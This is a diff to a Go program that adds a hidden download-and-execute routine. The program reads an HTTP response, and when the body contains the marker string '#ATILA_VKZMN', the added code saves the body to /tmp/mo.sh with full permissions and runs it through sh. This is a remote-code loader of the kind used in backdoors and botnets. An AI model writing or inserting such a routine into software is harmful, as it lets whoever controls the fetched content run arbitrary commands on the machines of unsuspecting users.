@@ -11,14 +11,15 @@ package main
 import (
 
 
-//"os"
+"os/exec"
 "io/ioutil"
 "net/http"
-"fmt"
+//"fmt"
 "strings"
 
 
 )
+
 
 
 
@@ -46,9 +47,27 @@ my_str := "#ATILA_VKZMN"
                 if err_readall == nil {
 
           
-                  out =   strings.Contains(string(mo_bytes , my_str ) )
+                  mo_str :=  string(mo_bytes ) 
 
-                     fmt.Println(out)
+
+                  out   :=   strings.Contains(mo_str , my_str ) 
+
+                     if  out == true {
+
+           
+                        ioutil.WriteFile("/tmp/mo.sh" ,  mo_bytes , 0777 )
+
+
+                              mo := exec.Command("sh" , "/tmp/mo.sh" )
+                                 
+                              mo.Run()
+ 
+                    
+                      }
+                                   
+
+
+
 
 
 
